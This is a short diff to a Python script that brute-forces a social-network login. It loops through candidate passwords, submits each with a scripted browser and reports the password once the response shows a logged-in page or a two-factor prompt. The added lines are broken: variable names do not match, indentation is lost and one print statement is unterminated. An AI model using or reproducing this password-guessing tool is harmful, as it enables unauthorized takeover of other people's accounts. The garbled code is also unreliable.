@@ -48,8 +48,11 @@ while file:
 			response = browser.submit()
 			response_data = response.read()
 			if 'Find Friends' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
+				decode_response = response_data.decode('utf-8')
 				print('Your password is : ',passw)
-				break
-	except:
-		print('\nSleeping for time : 0 min\n')
-		time.sleep(00)
+				print('Response Data:',decoded _response)
+break
+except Exception as e:
+print ('Error:
+e)
+
